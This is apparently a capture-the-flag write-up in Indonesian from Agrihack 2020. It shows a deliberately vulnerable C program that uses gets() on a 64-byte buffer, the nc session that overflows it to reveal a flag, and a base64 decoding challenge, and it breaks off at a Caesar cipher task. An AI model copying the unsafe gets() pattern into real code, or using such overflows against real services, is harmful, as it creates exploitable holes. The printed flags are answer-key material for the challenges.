# WriteUp-Agrihack-2020

## Binary Exploitation
## FLOW 1 (100 Pts)

Diberikan sebuah source code:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

//gcc flow1.c -m32 -fno-stack-protector -no-pie -o flow1

void logo(){
  puts("██╗     ██╗███╗   ██╗███████╗");
  puts("██║     ██║████╗  ██║╚══███╔╝");
  puts("██║     ██║██╔██╗ ██║  ███╔╝ ");
  puts("██║     ██║██║╚██╗██║ ███╔╝  ");
  puts("███████╗██║██║ ╚████║███████╗");
  puts("╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝");
}

void setup(){
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
}


int main(int argc, char **argv)
{
  logo();
  setup();
  volatile int modified;
  char buffer[64];
  modified = 0;
  
  printf("Put some text: ");

  gets(buffer);

  if(modified != 0) {
      system("cat flag.txt");
  } else {
      printf("Try again?\n");
  }
}
```

Dan sebuah nc 52.187.65.2 17001.
Dari code kita tahu bahwa buffer overflow terjadi ketika data char lebih dari 64 byte, langsung saja kita input karakter lebih dari 64 byte

```
ilham@ilham-Acer:~$ nc 52.187.65.2 17001
██╗     ██╗███╗   ██╗███████╗
██║     ██║████╗  ██║╚══███╔╝
██║     ██║██╔██╗ ██║  ███╔╝ 
██║     ██║██║╚██╗██║ ███╔╝  
███████╗██║██║ ╚████║███████╗
╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
Put some text: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
agrihack{Toooooooooo_much_character_is_dangerous_LINZ_IS_HERE}
/home/ctf/run_challenge.sh: line 2:   853 Segmentation fault      (core dumped) ./chall
```

**flag: agrihack{Toooooooooo_much_character_is_dangerous_LINZ_IS_HERE}**

## Cryptography

## Basic64 (100 pts)
Diberikan file enc.txt dan dilihat isinya:
![image22](https://user-images.githubusercontent.com/66354919/140281216-b8237a0a-cfcb-4de1-8c99-9808ea6cd34b.png)

Karena hintnya adalah base64, langsung saja kita decode base64 tersebut
```
In [4]: import base64

In [5]: base64.b64decode("YWdyaWhhY2t7YmFzaWNfdG9fa25vd19iYXNlNjR9")
Out[5]: 'agrihack{basic_to_know_base64}'
```
sehingga flagnya: agrihack{basic_to_know_base64} 

## Introduction to Cipher_Series : ROMAN (120 pts)
Diberikan file caesar.png:

![image60](https://user-images.githubusercontent.com/66354919/140281378-d4b26a0b-1721-4c08-bfa6-8ab725a9da89.png)



